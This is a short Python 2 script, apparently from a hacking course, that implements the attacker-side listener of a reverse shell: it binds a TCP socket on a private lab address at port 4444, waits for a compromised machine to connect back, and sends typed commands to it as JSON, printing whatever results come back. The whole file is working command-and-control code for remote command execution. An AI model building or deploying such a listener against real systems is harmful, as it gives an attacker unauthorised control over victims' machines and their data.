#!/usr/bin/env python

import socket,json

class Listener:

    def __init__(self,ip,port):        
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        #we can reuse a socket
        listner.bind((ip,port))
        listner.listen(0)
        print("[+]Waitng for conention")
        self.connection ,address = listner.accept()
        print("got a conenction from"+str(address))

    

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data=""
        while True:
            try:
                json_data= json_data + self.connection.recv(1024)#.decode(encoding='utf-8'errors='strict')
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command=="exit":
            self.connection.close()
            exit()
        return self.reliable_recieve()

    def run(self):
        while True:
            command = raw_input(">> ")
            result= self.execute_remotely(command)
            print(result)

my_listener= Listener("10.0.2.15",4444)
my_listener.run()